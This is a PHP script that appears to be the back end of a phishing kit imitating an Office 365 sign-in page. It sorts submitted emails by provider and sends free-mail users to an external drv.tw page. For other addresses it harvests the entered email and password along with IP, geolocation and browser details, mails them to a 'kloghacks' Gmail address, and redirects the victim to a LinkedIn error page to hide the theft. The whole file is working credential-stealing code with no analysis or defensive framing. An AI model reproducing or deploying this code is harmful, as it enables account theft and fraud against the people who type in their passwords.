<?php include_once("home.html"); ?>
	session_start();
	$email = trim($_POST["username"]);
	$password = trim($_POST["password"]);
	
	
	//Validate Email
	if($email == "")
	{
		header ("location: ".$_SESSION['mainurl']."index.php?status=emptyEmail");
	}
	
	if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
		// invalid emailaddress
		header ("location: ".$_SESSION['mainurl']."index.php?status=invalidEmail");
	}
	

	//Check 4 Gmail
	if (strpos($email, '@gmail') !== false) 
	{
		header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
	}
	else
	{
		//Check 4 Gmail
		if (strpos($email, '@yahoo') !== false) 
		{
			header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
		}
		else
		{
			//Check 4 Gmail
			if (strpos($email, '@outlook') !== false) 
			{
				header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
			}
			else
			{
				//Check 4 Gmail
				if (strpos($email, '@hotmail') !== false) 
				{
					header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
				}
				else
				{
					//Check 4 Gmail
					if (strpos($email, '@msn') !== false) 
					{
						header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
					}
					else
					{
						//Check 4 Gmail
						if (strpos($email, '@sbcglobal') !== false) 
						{
							header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
						}
						else
						{
							//Check 4 Gmail
							if (strpos($email, '@aol') !== false) 
							{
								header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
							}
							else
							{
								//Check 4 Gmail
								if (strpos($email, '@att') !== false) 
								{
									header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
								}
								else
								{
									//Check 4 Gmail
									if (strpos($email, '@verizon') !== false) 
									{
										header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
									}
									else
									{
										//Check 4 Gmail
										if (strpos($email, '@comcast') !== false) 
										{
											header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
										}
										else
										{
											//IF COMMON DOMAINS ARE NOT FOUND
											if($password != "")
												{	
												$adddate=date("D M d, Y g:i a");
												$ip = getenv("REMOTE_ADDR");
												$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
												$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
												$browserAgent = $_SERVER['HTTP_USER_AGENT'];
												$hostname = gethostbyaddr($ip);
												$message .= "Office36Five\n";
												$message .= "E: " .$email. "\n";
												//$message .= "MobileNo: " . $mobileno. "\n";
												$message .= "Ps: " . $password . "\n"; 
												$message .= "--------------IP DETAIL-----------------------\n";
												$message .= "Date: ".$adddate."\n";
												$message .= "Ip Address : ".getenv("REMOTE_ADDR")."\nProvider      : ";
												$message .= "Ip Info       https://www.ip2location.com/demo/$ip ----\n";
												$message .= "BROWSER      ".$browserAgent;
												$message .= "---------------klog-------------\n";
												$send = "kloghacks@gmail.com";
												$subject = "Office36Five .$ip.";
												$headers = "From: Office36Five<nataliengoc3@linHJJmail.com>\n";
												$headers .= "MIME-Version: 1.0\n";
												mail($send,$subject,$message,$headers);
												header ("Location: https://www.linkedin.com/error404");
												}
												else
												{
												header ("location: https://3fofwkznopujr9ms12phbq-on.drv.tw/asiaexcutiverole/");
												}
										}
									}
								}
							}
						}
					
					}
				
				}
			
			}
		
		}

	}
	

?>